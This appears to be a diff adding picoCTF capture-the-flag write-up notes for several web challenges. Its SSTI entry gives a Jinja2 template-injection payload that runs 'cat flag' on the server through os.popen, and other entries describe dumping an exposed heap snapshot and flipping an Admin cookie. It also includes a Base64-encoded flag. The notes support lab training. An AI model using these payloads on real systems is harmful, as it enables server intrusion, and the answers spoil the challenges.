@@ -546,3 +546,134 @@ Password is within the file, Put it within picoCTF{...}
 ```
 cat VaultDoorTraining.java
 ```
+
+
+
+## SSTI1
+
+Server-Side Template Injection (SSTI)
+```
+{{7*7}}
+```
+```
+{{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}}
+```
+
+
+
+## head-dump
+
+Click on `# API-Documentation`
+
+This opens
+```
+http://verbal-sleep.picoctf.net:56550/api-docs/
+```
+
+Now It says there is a `/heapdump`
+```
+http://verbal-sleep.picoctf.net:56550/heapdump
+```
+
+This prompts to download heapdump of the website
+
+Now 
+```
+cat heapdump-1743316813402.heapsnapshot  | grep "picoCTF"
+```
+
+
+
+## WebDecode
+
+Navigate to About page
+```
+http://titan.picoctf.net:59394/about.html
+```
+
+Now open Inspect mode
+
+See notify_true
+```
+cGljb0NURnt3ZWJfc3VjYzNzc2Z1bGx5X2QzYzBkZWRfMDJjZGNiNTl9
+```
+
+It is a Base64
+
+Decoding gives the flag
+
+
+
+## Unminify
+
+Inspect the page, and see the source code
+
+
+
+## Inspect HTML
+
+Inspect the page, Flag is written in comments
+
+
+
+## Includes
+
+Inspect then, Open Networks tab, Refresh the page
+
+See the .css and .js
+
+The flags are written there
+
+
+
+## where are the robots
+
+Try opening robots.txt
+
+```
+http://jupiter.challenges.picoctf.org:60915/robots.txt
+```
+
+It says 
+```
+User-agent: *
+Disallow: /8028f.html
+```
+
+Now open 
+```
+http://jupiter.challenges.picoctf.org:60915/8028f.html
+```
+
+
+
+## Insp3ct0r
+
+Inspect the page,
+
+HTML codes gives part 1 of the flag
+
+Now open sources and see the .css and .js for other two parts of the flag.
+
+
+
+## logon
+
+Login with anything
+
+Open Applications then Cookies
+
+Here you see Admin : False
+
+Make Admin to True and then Refresh the page
+
+
+
+## dont-use-client-side
+
+Inspect the page
+
+See function verify
+
+Write it in order, the order is like `checkpass.substring("<Start><END>")
+
